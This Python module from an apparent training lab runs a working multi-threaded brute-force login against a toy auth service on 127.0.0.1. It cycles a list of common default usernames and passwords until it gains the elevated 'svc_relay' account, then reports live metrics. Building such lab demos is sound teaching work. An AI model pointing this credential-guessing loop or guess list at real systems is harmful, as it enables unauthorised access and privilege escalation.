"""
real_attacks/real_priv_esc.py
================================
SAFETY NOTE
-----------
This performs a REAL brute-force login against a REAL toy auth
service - but that service exists only in this project, only on
127.0.0.1, and uses intentionally weak, disclosed demo credentials
planted specifically for this exercise (see TOY_CREDENTIALS in
dummy_target.py). This is the same pattern as intentionally-
vulnerable training labs (DVWA, WebGoat, etc.): a real, working
brute-force technique demonstrated against a service built to be
attacked for learning, never against a real production system.

WHAT THIS ACTUALLY DOES
------------------------
Repeatedly sends real LOGIN attempts over a real TCP socket, working
through a small real guess list until it genuinely authenticates as
the elevated "svc_relay" account. The device's own real
auth_failures / achieved_privilege_level counters (see
dummy_target.py) are what get_live_metrics() reports.

HOW TO RUN STANDALONE
----------------------
    python real_attacks/dummy_target.py
    python real_attacks/real_priv_esc.py
"""

import itertools
import socket
import threading
import time

from . import dummy_target as dt

TARGET_HOST = "127.0.0.1"
TARGET_PORT = dt.ADMIN_PORT

# A real, small guess list an attacker might genuinely try - including the
# one that actually works, so the demo genuinely succeeds in real time.
USERNAME_GUESSES = ["admin", "root", "svc_relay", "operator"]
PASSWORD_GUESSES = ["admin", "password", "changeme123", "operator123", "toor", "letmein"]


class RealPrivEscRunner:
    def __init__(self):
        self._stop_event = threading.Event()
        self._threads = []
        self._running = False

    def _worker(self):
        combos = list(itertools.product(USERNAME_GUESSES, PASSWORD_GUESSES))
        while not self._stop_event.is_set():
            for user, pw in combos:
                if self._stop_event.is_set():
                    return
                try:
                    s = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=1.0)
                    s.sendall(f"LOGIN {user} {pw}\n".encode())
                    s.recv(64)
                    s.close()
                except OSError:
                    pass
                time.sleep(0.15)

    def start(self):
        if self._running:
            return
        dt.state.reset_auth()
        self._running = True
        self._stop_event.clear()
        self._threads = [threading.Thread(target=self._worker, daemon=True) for _ in range(2)]
        for t in self._threads:
            t.start()

    def stop(self):
        self._stop_event.set()
        for t in self._threads:
            t.join(timeout=1.0)
        self._threads = []
        self._running = False

    @property
    def is_running(self):
        return self._running

    def get_live_metrics(self):
        with dt.state.lock:
            failures = dt.state.auth_failures
            successes = dt.state.auth_successes
            privilege = dt.state.achieved_privilege_level

        return {
            "auth_failures": failures,                # real count of real failed logins
            "privilege_level": privilege,                # real max privilege actually achieved
            "auth_successes": successes,
        }


if __name__ == "__main__":
    dt.device.start()
    time.sleep(0.2)
    runner = RealPrivEscRunner()
    runner.start()
    try:
        for _ in range(8):
            time.sleep(1)
            m = runner.get_live_metrics()
            print(f"auth_failures={m['auth_failures']:>4}  successes={m['auth_successes']:>3}  "
                  f"privilege_level={m['privilege_level']}")
    finally:
        runner.stop()
        print("Stopped.")
